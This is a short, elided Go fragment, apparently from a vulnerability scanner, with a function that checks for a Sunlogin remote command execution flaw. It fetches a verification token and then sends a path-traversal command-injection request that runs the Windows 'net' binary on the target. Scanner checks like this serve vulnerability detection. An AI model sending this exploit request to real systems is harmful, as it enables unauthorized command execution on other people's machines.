...
func SunloginRCE(url string) bool {
	if req, err := utils.HttpRequset(url+"/cgi-bin/rpc?action=verify-haras", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "verify_string") {
			...
			if req, err := utils.HttpRequset(url+"/check?cmd=ping../../../../../../../../../../../windows/system32/net", "GET", "", false, header); err == nil {
